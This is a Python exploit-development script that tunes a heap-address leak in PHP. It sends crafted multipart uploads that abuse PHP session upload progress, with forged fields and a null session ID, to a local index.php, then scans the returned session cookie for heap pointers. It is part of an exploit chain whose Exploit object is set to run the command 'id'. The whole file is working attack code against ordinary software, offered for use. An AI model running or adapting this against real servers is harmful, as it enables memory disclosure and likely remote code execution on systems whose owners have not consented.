#!/usr/bin/env python3
"""8.5.11: wide calibration search — vary N AND forged-field shape to find the heap-leak."""
import os
import sys, time, struct, re, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, Exploit, build_multipart

t = Target("http://127.0.0.1:18114/index.php", timeout=90.0, verbose=False)

def cookie_of(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(0, len(cookie)-8, 8):
        v = int.from_bytes(cookie[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, cnt = c.most_common(1)[0]
    return base if cnt >= 8 else 0

ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")
HEX26 = b"0123456789abcdef0123456789ab"

def reqA():
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)

def reqB(n, flen=79, q_val=0x1000, q_off=0x10, L_off=0x18):
    parts = [{"name":"PHPSESSID","data":HEX26},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(n):
        parts.append({"name": str(1000+i), "data": (f"v{i:04d}"+"x"*44)[:48].encode()})
    forge = bytearray(b"A"*flen)
    struct.pack_into("<Q", forge, q_off, q_val)
    forge[L_off] = ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    return t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

# Phase 1: wide N scan with the standard forged field
print("=== Phase 1: wide N scan (forged 79B, 0x1000@0x10, L@0x18) ===")
for n in range(600, 1201, 10):
    reqA(); time.sleep(0.2)
    ck = cookie_of(reqB(n)); base = heap_base(ck)
    mark = f"LEAK 0x{base:x}" if base else f"c={len(ck)}"
    print(f"  n={n}: {mark}", flush=True)
    if base:
        print(f"  >>> FOUND n={n} base=0x{base:x}"); sys.exit(0)

# Phase 2: for the best N (or a few), vary forged-field length & q_val
print("=== Phase 2: forged-field shape scan (n=841, 860) ===")
for n in (820, 841, 860):
    for flen in (64, 79, 96, 128):
        for q_val in (0x1000, 0x2000, 0x4000, 0x8000):
            reqA(); time.sleep(0.2)
            ck = cookie_of(reqB(n, flen=flen, q_val=q_val)); base = heap_base(ck)
            mark = f"LEAK 0x{base:x}" if base else f"c={len(ck)}"
            print(f"  n={n} flen={flen} q=0x{q_val:x}: {mark}", flush=True)
            if base:
                print(f"  >>> FOUND n={n} flen={flen} q=0x{q_val:x} base=0x{base:x}"); sys.exit(0)
print("NO LEAK in expanded parameter space")
sys.exit(1)
